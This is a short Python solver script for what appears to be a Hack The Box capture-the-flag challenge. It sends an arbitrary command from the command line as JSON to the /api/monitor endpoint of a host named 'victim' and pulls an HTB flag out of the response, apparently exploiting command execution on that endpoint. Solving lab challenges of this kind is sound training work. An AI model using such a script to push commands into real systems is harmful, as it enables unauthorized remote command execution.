import datetime
import hashlib
import re
import sys

import requests

if len(sys.argv) < 2:
    print("Usage: python solver.py <command>")
    sys.exit(1)

command_input = sys.argv[1]
hostURL = "http://victim:1337"

session = requests.session()


def getFlag():
    jData = {"command": command_input}

    req_stat = session.post(f"{hostURL}/api/monitor", json=jData)
    flag = re.findall(r"(HTB\{.*?\})", req_stat.text)
    if flag:
        print(f"{flag[0]}")
    else:
        print("No flag found")


getFlag()
